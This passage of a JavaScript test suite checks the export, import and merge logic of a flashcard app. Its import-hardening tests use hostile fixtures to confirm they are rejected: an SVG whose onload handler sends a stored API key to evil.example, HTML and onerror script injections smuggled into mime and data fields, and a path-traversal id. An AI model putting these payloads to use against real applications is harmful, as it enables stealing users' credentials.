  assert.deepEqual(row[4].split(" "), ["marginalia", "griffiths", "qm"]);
  // braces inside math and \{ are never deletions; a brace spanning a math run is one deletion
  const tricky = withDue(Object.assign({}, f.prompts[1], { id: "p_tricky", text: "Set $\\frac{a}{b}$ then \\{literal\\} and {x = $\\sqrt{2}$ here} and {second}" }));
  const r2 = rows(exporter.toAnkiTSV({ attachments: [], collections: f.collections, prompts: [tricky] })).find((r) => r[0] === "Cloze");
  assert.ok(r2, "the tricky prompt is a cloze");
  assert.ok(r2[2].includes("{{c1::x = "), r2[2]);
  assert.ok(r2[2].includes("{{c2::second}}"), r2[2]);
  assert.ok(!r2[2].includes("{{c3::"));
  assert.ok(!/\{\{c\d+::a\}\}/.test(r2[2]));
  // the numbering helper accepts brace-inclusive spans, inner spans, or hidden text alone
  assert.equal(exporter.numberClozes("a {b} c {d}", [{ start: 2, end: 5, text: "b" }, { start: 8, end: 11, text: "d" }]), "a {{c1::b}} c {{c2::d}}");
  assert.equal(exporter.numberClozes("a {b} c {d}", [{ start: 3, end: 4, text: "b" }, { start: 9, end: 10, text: "d" }]), "a {{c1::b}} c {{c2::d}}");
  assert.equal(exporter.numberClozes("a {b} c {d}", [{ text: "b" }, { text: "d" }]), "a {{c1::b}} c {{c2::d}}");
  assert.deepEqual(exporter.scanDeletions("$\\frac{a}{b}$ \\{x\\} {y $z$} {w}").map((d) => d.text), ["y $z$", "w"]);
});

// ----------------------------------------------------------------- Markdown

test("toMarkdown: headings, paragraphs as typed, notes and highlights as quotes, images as data URIs, page lines", () => {
  const f = fixture();
  const md = exporter.toMarkdown({ attachments: f.attachments, collections: f.collections, prompts: f.prompts });
  assert.ok(md.startsWith("# Griffiths\n\n## Ch. 1 · The Wave Function\n\n"), md.slice(0, 80));
  assert.ok(md.includes("Q. What does V stand for?\nA. The potential energy ![snip](data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==)\n#qm #ch1\n\n*(p. 12)*"), md);
  assert.ok(md.includes("The {wave function} $\\Psi(x,t)$ solves the {Schrödinger equation}.\n#qm\n\n*(p. 12)*"), md);
  assert.ok(md.includes("> Remember: <b>normalisation</b> fixes A & phase\n\n*(p. 13)*"), md);
  assert.ok(md.includes("> statistical interpretation\n\n*(p. 13)*"), md);
  assert.ok(md.includes("# Thermo formulas\n\n## Laws\n\nQ. First law\nA. $dU = \\delta Q - \\delta W$\n"), md);
  assert.ok(md.endsWith("W$\n"), "deck prompts have no page line");
  assert.ok(!md.includes("Deleted?"));
  assert.ok(!md.includes("(p. )"));
  const noImg = exporter.toMarkdown({ attachments: f.attachments, collections: f.collections, prompts: f.prompts, includeImages: false });
  assert.ok(!noImg.includes("data:image"));
  assert.ok(noImg.includes("[image]"));
});

// ------------------------------------------------------- import / prepare

test("importJSON: validates the backup, writes through M.cache/M.store, restores settings; prepare() reads bytes back", async () => {
  const f = fixture();
  const json = exporter.toJSON({ attachments: f.attachments, collections: f.collections, prompts: f.prompts, settings: { reviewKeys: { forgot: "ArrowLeft" }, snipMode: "latex" } });
  const saved = { collections: [], prompts: [], attachments: new Map(), settings: {}, toasts: [] };
  const prev = { cache: M.cache, store: M.store, settings: M.settings, app: M.app };
  M.cache = {
    collections: () => saved.collections,
    prompts: () => saved.prompts,
    async saveCollection(c) { const i = saved.collections.findIndex((x) => x.id === c.id); if (i < 0) saved.collections.push(c); else saved.collections[i] = c; return c; },
    async savePrompt(p, o) { assert.deepEqual(o, { content: false }); const i = saved.prompts.findIndex((x) => x.id === p.id); if (i < 0) saved.prompts.push(p); else saved.prompts[i] = p; return p; }
  };
  M.store = { attachments: {
    async allIds() { return [...saved.attachments.keys()]; },
    async put(a) { saved.attachments.set(a.id, a); },
    async get(id) { return saved.attachments.get(id) || null; }
  } };
  M.settings = { set(k, v) { saved.settings[k] = v; }, get(k) { return saved.settings[k]; }, all() { return saved.settings; } };
  M.app = { toast(t) { saved.toasts.push(t.text); return { close() {} }; } };
  try {
    await assert.rejects(exporter.importJSON("not json"), (e) => e.code === "invalid_json");
    await assert.rejects(exporter.importJSON(JSON.stringify({ format: "other", version: 1 })), (e) => e.code === "bad_format");
    await assert.rejects(exporter.importJSON(JSON.stringify({ format: "marginalia", version: 2 })), (e) => e.code === "unsupported_version");
    const report = await exporter.importJSON(json, { restoreSettings: true });
    assert.deepEqual([report.added, report.updated, report.unchanged, report.skipped, report.failed], [6, 0, 0, 0, 0]);
    assert.equal(report.collections.added, 2);
    assert.equal(report.attachments.added, 1);
    assert.equal(saved.prompts.length, 6);
    assert.equal(saved.collections.find((c) => c.id === BOOK_ID).hasBytes, false);
    const att = saved.attachments.get("a_1");
    assert.ok(att.bytes instanceof ArrayBuffer);
    assert.equal(att.byteLength, 16);
    assert.equal(Buffer.from(att.bytes).toString("base64"), "iVBORw0KGgoAAAANSUhEUg==");
    assert.deepEqual(saved.settings, { reviewKeys: { forgot: "ArrowLeft" }, snipMode: "latex" });
    assert.match(saved.toasts[0], /^Imported 6 prompts \(6 new, 0 updated, 0 unchanged\)/);
    const again = await exporter.importJSON(json, { restoreSettings: false });
    assert.deepEqual([again.added, again.updated, again.unchanged], [0, 0, 6]);
    // prepare() reads attachment bytes from the store and names the file with the local date
    const prepared = await exporter.prepare("json", { scope: "all", includeImages: true });
    assert.match(prepared.filename, /^marginalia-backup-\d{4}-\d{2}-\d{2}\.json$/);
    assert.equal(prepared.mime, "application/json");
    assert.equal(prepared.bytes, Buffer.byteLength(prepared.text));
    const pb = JSON.parse(prepared.text);
    assert.deepEqual(pb.attachments, [{ id: "a_1", mime: "image/png", width: 10, height: 10, data: "iVBORw0KGgoAAAANSUhEUg==" }]);
    assert.deepEqual(pb.settings, { reviewKeys: { forgot: "ArrowLeft" }, snipMode: "latex" });
    assert.equal(pb.prompts.length, 6);
    const anki = await exporter.prepare("anki", {});
    assert.equal(anki.filename, "marginalia-anki.txt");
    assert.equal(anki.mime, "text/plain");
    assert.ok(anki.text.startsWith("#separator:tab\n"));
    const md = await exporter.prepare("markdown", { scope: "collection", collectionId: DECK_ID });
    assert.equal(md.filename, "marginalia.md");
    assert.equal(md.mime, "text/markdown");
    assert.ok(md.text.startsWith("# Thermo formulas\n"));
    assert.ok(!md.text.includes("Griffiths"));
    await assert.rejects(exporter.prepare("docx", {}), (e) => e.code === "bad_format");
  } finally {
    M.cache = prev.cache; M.store = prev.store; M.settings = prev.settings; M.app = prev.app;
  }
});

test("deliver resolves 'fallback' without a DOM; byte helpers round-trip", async () => {
  assert.equal(await exporter.deliver("x.json", "{}", "application/json"), "fallback");
  assert.equal(exporter.utf8Length("aé€😀"), 1 + 2 + 3 + 4);
  const u8 = new Uint8Array([0, 1, 2, 250, 251, 252, 253, 254, 255]);
  assert.deepEqual(Array.from(exporter.base64ToBytes(exporter.bytesToBase64(u8))), Array.from(u8));
});

// ------------------------------------------------- import hardening (§9)

const b64 = (s) => Buffer.from(s).toString("base64");
const b64Bytes = (arr) => Buffer.from(arr).toString("base64");
const PNG_HEAD = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52];
const PNG = b64Bytes(PNG_HEAD);
const JPEG = b64Bytes([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46]);
const GIF = b64("GIF89a\x01\x00\x01\x00");
const WEBP = b64Bytes([0x52, 0x49, 0x46, 0x46, 26, 0, 0, 0, 0x57, 0x45, 0x42, 0x50, 0x56, 0x50, 0x38, 0x20]);
const SVG = "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"fetch('https://evil.example/?k='+localStorage['marginalia.apiKey'])\"></svg>";
const MAX_IMG = 4 * 1024 * 1024;
function pngOfSize(n) { const b = Buffer.alloc(n); Buffer.from(PNG_HEAD).copy(b); return b; }
// A fixture whose qa prompt references `id` instead of a_1.
function referencing(id) {
  const f = fixture();
  f.prompts[0].text = f.prompts[0].text.replace("att:a_1", "att:" + id);
  return f;
}
function stubCacheStore(saved) {
  return {
    cache: {
      collections: () => saved.collections,
      prompts: () => saved.prompts,
      async saveCollection(c) { saved.writes++; const i = saved.collections.findIndex((x) => x.id === c.id); if (i < 0) saved.collections.push(c); else saved.collections[i] = c; return c; },
      async savePrompt(p) { saved.writes++; const i = saved.prompts.findIndex((x) => x.id === p.id); if (i < 0) saved.prompts.push(p); else saved.prompts[i] = p; return p; }
    },
    store: { attachments: {
      async allIds() { return [...saved.attachments.keys()]; },
      async put(a) { saved.writes++; saved.attachments.set(a.id, a); },
      async get(id) { return saved.attachments.get(id) || null; }
    } }
  };
}
async function withStubs(saved, fn) {
  const prev = { cache: M.cache, store: M.store, app: M.app };
  const s = stubCacheStore(saved);
  M.cache = s.cache; M.store = s.store; M.app = { toast(t) { (saved.toasts = saved.toasts || []).push(t.text); return { close() {} }; } };
  try { return await fn(); } finally { M.cache = prev.cache; M.store = prev.store; M.app = prev.app; }
}

test("merge: only raster images are imported — SVG/HTML payloads, mislabelled bytes and bad ids are skipped; the mime is the sniffed one", () => {
  const f = fixture();
  const b = backupOf(f);
  b.attachments = [
    { id: "a_svg", mime: "image/svg+xml", width: 10, height: 10, data: b64(SVG) },
    { id: "a_html", mime: "text/html\" onerror=\"steal(1)", width: 10, height: 10, data: b64("<html><script>steal(1)</script></html>") },
    { id: "a_lie", mime: "image/png", width: 10, height: 10, data: b64(SVG) },
    { id: "a_mismatch", mime: "image/png", width: 10, height: 10, data: JPEG },
    { id: "a_weird", mime: 42, width: 10, height: 10, data: PNG },
    { id: "a/../x", mime: "image/png", width: 10, height: 10, data: PNG },
    { id: "a_junk", mime: "image/png", width: 10, height: 10, data: PNG + "\"><img src=x onerror=steal(1)>" },
    { id: "a_empty", mime: "image/png", width: 10, height: 10, data: "" },
    { id: "a_png", mime: "image/png", width: 10, height: 10, data: PNG },
    { id: "a_nomime", width: 4, height: 4, data: PNG },
    { id: "a_jpeg", mime: " IMAGE/JPEG ", width: 4, height: 4, data: JPEG },
    { id: "a_gif", mime: "image/gif", width: null, height: null, data: GIF },
    { id: "a_webp", mime: "image/webp", width: 1, height: 1, data: WEBP.replace(/(.{8})/g, "$1\n") }
  ];
  const { state, report } = exporter.merge({ collections: f.collections, prompts: f.prompts, attachments: [] }, b);
  assert.deepEqual([report.attachments.added, report.attachments.skipped, report.attachments.unchanged], [5, 8, 0]);
  const got = Object.fromEntries(state.attachments.map((a) => [a.id, a]));
  assert.deepEqual(Object.keys(got).sort(), ["a_gif", "a_jpeg", "a_nomime", "a_png", "a_webp"]);
  assert.deepEqual(got.a_png, { id: "a_png", mime: "image/png", width: 10, height: 10, data: PNG });
  assert.equal(got.a_nomime.mime, "image/png");
  assert.equal(got.a_jpeg.mime, "image/jpeg");
  assert.deepEqual([got.a_gif.mime, got.a_gif.width, got.a_gif.height], ["image/gif", null, null]);
  assert.equal(got.a_webp.mime, "image/webp");
  assert.equal(got.a_webp.data, WEBP, "whitespace in the base64 is dropped");
  assert.equal(report.attachments.bytes, 16 + 16 + 10 + 10 + 16);
  assert.deepEqual(report.changed.attachments.map((a) => a.id).sort(), Object.keys(got).sort());
});

test("importJSON: stored attachments are raster images whose bytes start with their format's signature", async () => {
  const f = fixture();
  const b = backupOf(f);
  b.attachments = [
    { id: "a_1", mime: "image/svg+xml", width: 10, height: 10, data: b64(SVG) },
    { id: "a_html", mime: "text/html", width: 10, height: 10, data: b64("<html><script>steal(1)</script></html>") },
    { id: "a_ok", mime: "image/png", width: 10, height: 10, data: PNG },
    { id: "a_jpg", mime: "image/jpeg", width: 10, height: 10, data: JPEG }
  ];
  const saved = { collections: [], prompts: [], attachments: new Map(), writes: 0 };
  const report = await withStubs(saved, () => exporter.importJSON(JSON.stringify(b)));
  assert.deepEqual([report.attachments.added, report.attachments.skipped, report.failed], [2, 2, 0]);
  assert.deepEqual([...saved.attachments.keys()].sort(), ["a_jpg", "a_ok"]);
  const ok = saved.attachments.get("a_ok"), jpg = saved.attachments.get("a_jpg");
  assert.equal(ok.mime, "image/png");
  assert.deepEqual([...new Uint8Array(ok.bytes).slice(0, 8)], PNG_HEAD.slice(0, 8));
  assert.equal(ok.byteLength, 16);
  assert.equal(jpg.mime, "image/jpeg");
  assert.deepEqual([...new Uint8Array(jpg.bytes).slice(0, 3)], [0xff, 0xd8, 0xff]);
  assert.match(saved.toasts[0], /2 images skipped/);
});

test("exports never carry a non-raster data: URL, whatever mime a record claims (Anki, fallback Anki, Markdown, JSON)", () => {
  const f = referencing("a_evil");
  const evil = [{ id: "a_evil", mime: "image/svg+xml", width: 10, height: 10, data: b64(SVG) }];
  const spoof = [{ id: "a_evil", mime: "image/png\" onerror=\"steal(1)", width: "x", height: 10, data: PNG }];
  const opts = (attachments) => ({ attachments, collections: f.collections, prompts: f.prompts, includeImages: true });
  for (const out of [exporter.toAnkiTSV(opts(evil)), exporter.toMarkdown(opts(evil)), exporter.toJSON(Object.assign(opts(evil), { settings: {} }))]) {
    assert.ok(!/data:image\/svg|svg\+xml|onload/.test(out), out.slice(0, 200));
  }
  assert.deepEqual(JSON.parse(exporter.toJSON(Object.assign(opts(evil), { settings: {} }))).attachments, []);
  const anki = exporter.toAnkiTSV(opts(spoof)), md = exporter.toMarkdown(opts(spoof));
  assert.ok(anki.includes("data:image/png;base64," + PNG) && !anki.includes("onerror"), anki);
  assert.ok(md.includes("![snip](data:image/png;base64," + PNG + ")") && !md.includes("onerror"), md);
  assert.deepEqual(JSON.parse(exporter.toJSON(Object.assign(opts(spoof), { settings: {} }))).attachments,
    [{ id: "a_evil", mime: "image/png", width: null, height: 10, data: PNG }]);
  // the fallback Anki renderer (no M.markup.toAnki) applies the same rule
  const prevMarkup = M.markup;
  M.markup = {};
  try {
    const fbEvil = exporter.toAnkiTSV(opts(evil)), fbSpoof = exporter.toAnkiTSV(opts(spoof));
    assert.ok(!/svg|onload/.test(fbEvil) && fbEvil.includes("att--missing"), fbEvil);
    assert.ok(fbSpoof.includes("data:image/png;base64," + PNG) && !fbSpoof.includes("onerror"), fbSpoof);
  } finally { M.markup = prevMarkup; }
});

test("prepare(): a stored record that is not a raster image or is over the attachment limit is left out before encoding", async () => {
  const f = referencing("a_svg");
  f.prompts[1].text += " ![snip](att:a_big) ![snip](att:a_ok)";
  const recs = {
    a_svg: { id: "a_svg", mime: "image/svg+xml", bytes: new Uint8Array(Buffer.from(SVG)).buffer, width: 10, height: 10 },
    a_big: { id: "a_big", mime: "image/png", bytes: new Uint8Array(pngOfSize(MAX_IMG + 1)).buffer, width: 10, height: 10 },
    a_ok: { id: "a_ok", mime: "image/svg+xml", bytes: new Uint8Array(PNG_HEAD).buffer, width: "lots", height: 7 }
  };
  const prev = { cache: M.cache, store: M.store };
  M.cache = { collections: () => f.collections, prompts: () => f.prompts };
  M.store = { attachments: { async get(id) { return recs[id] || null; } } };
  try {
    const json = JSON.parse((await exporter.prepare("json", { scope: "all" })).text);
    assert.deepEqual(json.attachments, [{ id: "a_ok", mime: "image/png", width: null, height: 7, data: PNG }]);
    const md = (await exporter.prepare("markdown", { scope: "all" })).text;
    assert.ok(md.includes("![snip](data:image/png;base64," + PNG + ")"), md);
    assert.ok(md.includes("![snip](att:a_svg)") && md.includes("![snip](att:a_big)"), "left out like missing attachments");
    assert.equal((md.match(/data:/g) || []).length, 1);
  } finally { M.cache = prev.cache; M.store = prev.store; }
});

test("merge: attachments over the 4 MB limit, or with non-finite / non-positive dimensions, are skipped", () => {
  const f = fixture();
  const b = backupOf(f);
  b.attachments = [
    { id: "a_big", mime: "image/png", width: 10, height: 10, data: pngOfSize(MAX_IMG + 1).toString("base64") },
    { id: "a_max", mime: "image/png", width: 10, height: 10, data: pngOfSize(MAX_IMG).toString("base64") },
    { id: "a_w", mime: "image/png", width: "lots", height: 10, data: PNG },
    { id: "a_h", mime: "image/png", width: 10, height: Infinity, data: PNG },
    { id: "a_nan", mime: "image/png", width: NaN, height: 10, data: PNG },
    { id: "a_neg", mime: "image/png", width: -1, height: 10, data: PNG },
    { id: "a_obj", mime: "image/png", width: 10, height: { nope: 1 }, data: PNG }
  ];
  const { state, report } = exporter.merge({ collections: f.collections, prompts: f.prompts, attachments: [] }, b);
  assert.deepEqual(state.attachments.map((a) => a.id), ["a_max"]);
  assert.deepEqual([report.attachments.added, report.attachments.skipped], [1, 6]);
  assert.equal(report.attachments.bytes, MAX_IMG);
});

test("importJSON: too many records or too many image bytes are refused before anything is written", async () => {
  const f = fixture();
  const saved = { collections: [], prompts: [], attachments: new Map(), writes: 0 };
  const tooMany = backupOf(f);
  tooMany.prompts = new Array(exporter.MAX_IMPORT_RECORDS + 1).fill({});
  await withStubs(saved, () => assert.rejects(exporter.importJSON(tooMany), (e) => e.code === "too_many_records" && /at most 200000/.test(e.message)));
  const heavy = backupOf(f);
  const data = pngOfSize(MAX_IMG).toString("base64");
  const n = exporter.MAX_IMPORT_BYTES / MAX_IMG + 1;
  heavy.attachments = Array.from({ length: n }, (x, i) => ({ id: "a_heavy" + i, mime: "image/png", width: 10, height: 10, data }));
  await withStubs(saved, () => assert.rejects(exporter.importJSON(heavy), (e) => e.code === "too_large" && /260 MB of images.*256 MB/.test(e.message)));
  assert.equal(saved.writes, 0, "nothing was written");
  // re-importing images that already exist does not count against the budget
  heavy.attachments.forEach((a) => saved.attachments.set(a.id, { id: a.id }));
  const report = await withStubs(saved, () => exporter.importJSON(heavy));
  assert.deepEqual([report.attachments.unchanged, report.attachments.added, report.failed], [n, 0, 0]);
});

test("merge: a collection the backup deletes takes its prompts with it — none stays live in a deleted collection", () => {
  const T = T0;
  const book = { id: "book_X", kind: "book", name: "X", sha256: "sx", hasBytes: true, chunkCount: 1, chunkSize: 8388608, sections: [],
    addedAt: T - DAY, lastOpenedAt: T, updatedAt: T + 50, deletedAt: null, v: 1 };
  const deck = { id: "deck_Y", kind: "deck", name: "Y", description: "", sections: [], addedAt: T - DAY, lastOpenedAt: T, updatedAt: T + 50, deletedAt: T + 50, v: 1 };
  const mk = (id, collectionId, cu, extra) => withDue(Object.assign({ id, collectionId, kind: "qa", text: "Q. " + id + "?\nA. yes", tags: [], flagged: false,
    anchor: null, context: null, cards: [cardAt(0, T)], createdAt: T, contentUpdatedAt: cu, updatedAt: cu, deletedAt: null, v: 1 }, extra || {}));
  const local = { collections: [book, deck], prompts: [mk("p_P", "book_X", T + 200), mk("p_R", "book_X", T), mk("p_D", "deck_Y", T, { deletedAt: T + 50 })], attachments: [] };
  const incP = mk("p_P", "book_X", T, { deletedAt: T + 100, updatedAt: T + 100 });
  const backup = {
    collections: [Object.assign({}, book, { deletedAt: T + 100, updatedAt: T + 100, hasBytes: false }), Object.assign({}, deck, { deletedAt: null, updatedAt: T + 10 })],
    prompts: [incP, mk("p_Q", "book_X", T + 90), mk("p_W", "deck_Y", T + 60)],
    attachments: []
  };
  const { state, report } = exporter.merge(local, backup);
  const get = (id) => state.prompts.find((p) => p.id === id);
  assert.equal(state.collections.find((c) => c.id === "book_X").deletedAt, T + 100);
  assert.equal(state.collections.find((c) => c.id === "deck_Y").deletedAt, T + 50, "the newer local tombstone wins");
  assert.equal(get("p_P").deletedAt, T + 100, "newer local content does not keep it live inside the deleted book");
  assert.equal(get("p_R").deletedAt, T + 100, "a local prompt the backup does not mention is cascaded");
  assert.equal(get("p_Q").deletedAt, T + 100, "an unknown prompt of the deleted book arrives as a tombstone");
  assert.equal(get("p_W").deletedAt, T + 50, "an unknown prompt of a locally deleted deck arrives as a tombstone");
  ["p_P", "p_R", "p_Q", "p_W"].forEach((id) => assert.equal("dueAt" in get(id), false, id));
  assert.equal(get("p_P").cards[0].log.length, 0, "history is kept on the tombstone");
  assert.deepEqual([report.added, report.updated, report.unchanged, report.cascaded], [2, 1, 0, 1]);
  assert.deepEqual([report.collections.removed, report.collections.updated, report.collections.unchanged], [1, 1, 1]);
  assert.deepEqual(report.changed.prompts.map((p) => p.id).sort(), ["p_P", "p_Q", "p_R", "p_W"]);
  assert.equal(local.prompts[1].deletedAt, null, "the local input is not mutated");
  if (typeof S.buildQueue === "function") assert.deepEqual(S.buildQueue({ prompts: state.prompts, scope: "all", now: T + 400 * DAY, seed: 1 }), []);
  assert.match(exporter.importSummary(Object.assign({ failed: 0 }, report)), /1 collection deleted, as in the backup · 1 more prompt deleted with it/);
});

test("merge: a deleted separate copy of a book (same sha256, another id) is its own record and never deletes the local book", () => {
  for (const order of ["after", "before"]) {
    const b = backupOf(fixture());
    const copy = Object.assign({}, b.collections.find((c) => c.id === BOOK_ID), { id: BOOK_ID + ":9f2a0000", name: "Griffiths (2)", deletedAt: T0 + 9000, updatedAt: T0 + 9000 });
    if (order === "after") b.collections.push(copy); else b.collections.unshift(copy);
    const { state, report } = exporter.merge(fixture(), b);
    const book = state.collections.find((c) => c.id === BOOK_ID);
    assert.deepEqual([book.deletedAt, book.hasBytes, book.name], [null, true, "Griffiths"], order);
    assert.deepEqual([report.collections.removed, report.collections.added, report.cascaded], [0, 1, 0], order);
    const created = state.collections.find((c) => c.id === copy.id);
    assert.deepEqual([created.deletedAt, created.hasBytes], [T0 + 9000, false], order);
    assert.ok(state.prompts.filter((p) => p.id !== "p_tomb").every((p) => p.deletedAt === null), order);
  }
});

test("merge: a backup listing a collection twice yields one final record, never a delete-then-restore half state", () => {
  const b = backupOf(fixture());
  const book = b.collections.find((c) => c.id === BOOK_ID);
  b.collections.push(Object.assign({}, book, { deletedAt: T0 + 100, updatedAt: T0 + 100 }), Object.assign({}, book, { name: "Back", updatedAt: T0 + 200 }));
  const { state, report } = exporter.merge(fixture(), b);
  const m = state.collections.find((c) => c.id === BOOK_ID);
  assert.deepEqual([m.deletedAt, m.name, m.hasBytes], [null, "Back", true]);
  assert.deepEqual(report.changed.collections.filter((c) => c.id === BOOK_ID), [m]);
  assert.deepEqual([report.collections.removed, report.cascaded], [0, 0]);
  assert.ok(state.prompts.filter((p) => p.id !== "p_tomb").every((p) => p.deletedAt === null));
});

test("merge: cards beyond what the winning text implies are dropped, so no phantom cloze card without a blank", () => {
  const base = fixture();
  // local removed the third deletion (newer content); the backup still has it and graded its card
  const local = fixture();
  const lp = local.prompts.find((p) => p.id === "p_cloze");
  Object.assign(lp, { text: "{a} and {b}", cards: [cardAt(0, T0 + 1), cardAt(1, T0 + 1)], contentUpdatedAt: T0 + 500, updatedAt: T0 + 500 });
  withDue(lp);
  const b = backupOf(base);
  const ip = b.prompts.find((p) => p.id === "p_cloze");
  Object.assign(ip, { text: "{a} and {b} and {c}", contentUpdatedAt: T0 + 100,
    cards: [cardAt(0, T0 + 1), cardAt(1, T0 + 1), cardAt(2, T0 + 1, [{ at: T0 + DAY, outcome: "forgot" }])] });
  withDue(ip);
  let m = exporter.merge(local, b).state.prompts.find((p) => p.id === "p_cloze");
  assert.equal(m.text, "{a} and {b}");
  assert.equal(m.cards.length, 2);
  assert.equal(m.dueAt, Math.min(m.cards[0].dueAt, m.cards[1].dueAt));
  if (typeof S.buildQueue === "function") {
    // a queue takes one card per prompt (D27): card 0 first, card 1 the day after card 0 is answered (D29); never a third card
    const q = S.buildQueue({ prompts: [m], scope: "all", now: T0 + 400 * DAY, seed: 1 });
    assert.deepEqual(q.map((it) => it.cardIndex), [0]);
    const m2 = Object.assign({}, m, { cards: [S.grade(m.cards[0], T0 + 400 * DAY, "remembered"), m.cards[1]] });
    assert.deepEqual(S.buildQueue({ prompts: [m2], scope: "all", now: T0 + 400 * DAY + 1000, seed: 1 }).map((it) => it.cardIndex), []);
    assert.deepEqual(S.buildQueue({ prompts: [m2], scope: "all", now: T0 + 400 * DAY + 16 * 3600000, seed: 1 }).map((it) => it.cardIndex), [1]);
  }
  // the other way round the newer three-deletion text keeps its third card
  m = exporter.merge({ collections: base.collections, prompts: b.prompts, attachments: [] }, { collections: [], prompts: [lp], attachments: [] })
    .state.prompts.find((p) => p.id === "p_cloze");
  assert.equal(m.text, "{a} and {b}");
  assert.equal(m.cards.length, 2);
  m = exporter.merge(local, Object.assign(backupOf(base), { prompts: [Object.assign({}, ip, { contentUpdatedAt: T0 + 900 })] }))
    .state.prompts.find((p) => p.id === "p_cloze");
  assert.equal(m.text, "{a} and {b} and {c}");
  assert.equal(m.cards.length, 3);
  assert.deepEqual(m.cards[2].log.map((e) => e.outcome), ["forgot"]);
  // a qa that wins over an older three-card cloze keeps one card; a note keeps whatever cards it has
  const qa = Object.assign({}, lp, { kind: "qa", text: "Q. a?\nA. b", cards: [cardAt(0, T0 + 1)] });
  m = exporter.merge({ collections: base.collections, prompts: [withDue(qa)], attachments: [] }, Object.assign(backupOf(base), { prompts: [ip] }))
    .state.prompts.find((p) => p.id === "p_cloze");
  assert.equal(m.cards.length, 1);
  const note = Object.assign({}, lp, { kind: "note", text: "just a note", cards: [] });
  m = exporter.merge({ collections: base.collections, prompts: [withDue(note)], attachments: [] }, Object.assign(backupOf(base), { prompts: [ip] }))
    .state.prompts.find((p) => p.id === "p_cloze");
  assert.equal(m.cards.length, 3);
  // an unknown prompt carrying a surplus card is trimmed too
  const stray = Object.assign({}, ip, { id: "p_stray", text: "{only one}" });
  m = exporter.merge({ collections: base.collections, prompts: [], attachments: [] }, Object.assign(backupOf(base), { prompts: [stray] }))
    .state.prompts.find((p) => p.id === "p_stray");
  assert.equal(m.cards.length, 1);
});

test("merge: a scroll on one side never discards the other side's rename or chapter marks", () => {
  const base = fixture();
  const manual = (pageIndex, title) => ({ title, label: title, pageIndex, level: 1, source: "manual" });
  // with content stamps: B renamed and marked a chapter at T0+10; A only scrolled at T0+20
  const local = fixture();
  const lb = local.collections[0];
  Object.assign(lb, { contentUpdatedAt: T0 - DAY, lastPosition: { pageIndex: 80, fraction: 0.1, zoom: "fit" }, updatedAt: T0 + 20 });
  const b = backupOf(base);
  const ib = b.collections.find((c) => c.id === BOOK_ID);
  Object.assign(ib, { name: "Griffiths QM", sections: ib.sections.concat([manual(40, "Ch. 4 · Spin")]), contentUpdatedAt: T0 + 10, updatedAt: T0 + 10 });
  let r = exporter.merge(local, b);
  let m = r.state.collections.find((c) => c.id === BOOK_ID);
  assert.equal(m.name, "Griffiths QM");
  assert.deepEqual(m.sections.map((s) => s.source + "@" + s.pageIndex), ["outline@10", "manual@40"]);
  assert.deepEqual(m.lastPosition, lb.lastPosition, "view state follows the newer write");
  assert.deepEqual([m.updatedAt, m.contentUpdatedAt], [T0 + 20, T0 + 10]);
  assert.equal(r.report.collections.updated, 1);
  // the mirror direction: A's own rename and mark survive B's later scroll
  const a2 = fixture();
  Object.assign(a2.collections[0], { name: "Griffiths QM", sections: a2.collections[0].sections.concat([manual(40, "Ch. 4 · Spin")]), contentUpdatedAt: T0 + 10, updatedAt: T0 + 10 });
  const b2 = backupOf(base);
  Object.assign(b2.collections.find((c) => c.id === BOOK_ID), { lastPosition: { pageIndex: 3, fraction: 0, zoom: "fit" }, contentUpdatedAt: T0 - DAY, updatedAt: T0 + 20 });
  m = exporter.merge(a2, b2).state.collections.find((c) => c.id === BOOK_ID);
  assert.equal(m.name, "Griffiths QM");
  assert.deepEqual(m.sections.map((s) => s.source + "@" + s.pageIndex), ["outline@10", "manual@40"]);
  assert.deepEqual(m.lastPosition, { pageIndex: 3, fraction: 0, zoom: "fit" });
  // with stamps on both sides a mark removed on the side with the newer content stays removed, despite a later scroll elsewhere
  const a4 = fixture();
  Object.assign(a4.collections[0], { contentUpdatedAt: T0 + 30, updatedAt: T0 + 30 });
  const b4 = backupOf(base);
  Object.assign(b4.collections.find((c) => c.id === BOOK_ID), { sections: base.collections[0].sections.concat([manual(40, "Ch. 4 · Spin")]),
    lastPosition: { pageIndex: 9, fraction: 0, zoom: "fit" }, contentUpdatedAt: T0 + 10, updatedAt: T0 + 40 });
  m = exporter.merge(a4, b4).state.collections.find((c) => c.id === BOOK_ID);
  assert.deepEqual(m.sections.map((s) => s.source + "@" + s.pageIndex), ["outline@10"]);
  assert.deepEqual([m.updatedAt, m.contentUpdatedAt, m.lastPosition.pageIndex], [T0 + 40, T0 + 30, 9]);
  // without content stamps the newer write still decides the name, but manual marks from both sides are kept
  // (one per page: the content winner's title wins), outline items are never duplicated
  const a3 = fixture();
  Object.assign(a3.collections[0], { sections: a3.collections[0].sections.concat([manual(60, "A's mark"), manual(40, "A's title")]), updatedAt: T0 + 20 });
  const b3 = backupOf(base);
  Object.assign(b3.collections.find((c) => c.id === BOOK_ID), { name: "B name", sections: base.collections[0].sections.concat([manual(40, "B's title"), manual(5, "B's early mark")]), updatedAt: T0 + 10 });
  r = exporter.merge(a3, b3);
  m = r.state.collections.find((c) => c.id === BOOK_ID);
  assert.equal(m.name, "Griffiths");
  assert.deepEqual(m.sections.map((s) => s.source + "@" + s.pageIndex + ":" + s.title),
    ["manual@5:B's early mark", "outline@10:1 The Wave Function", "manual@40:A's title", "manual@60:A's mark"]);
  assert.equal("contentUpdatedAt" in m, false, "no stamp is invented");
  assert.equal(r.report.collections.updated, 1);
  // importing the same backup again changes nothing
  const again = exporter.merge(r.state, b3);
  assert.equal(again.report.collections.unchanged, 2);
});

test("toAnkiTSV: a deleted collection exports nothing, even a prompt still live inside it", () => {
  const f = fixture();
  const cols = [Object.assign({}, f.collections[0], { deletedAt: T0 + 5 }), f.collections[1]];
  const tsv = exporter.toAnkiTSV({ attachments: [], collections: cols, prompts: f.prompts });
  assert.deepEqual(rows(tsv).map((r) => r[1]), ["Marginalia::Thermo formulas"]);
});

test("importJSON with the real cache and store: a deleted book frees its chunks and leaves no live prompt behind", async () => {
  const prev = { cache: M.cache, store: M.store, bus: M.bus, app: M.app };
  const events = [];
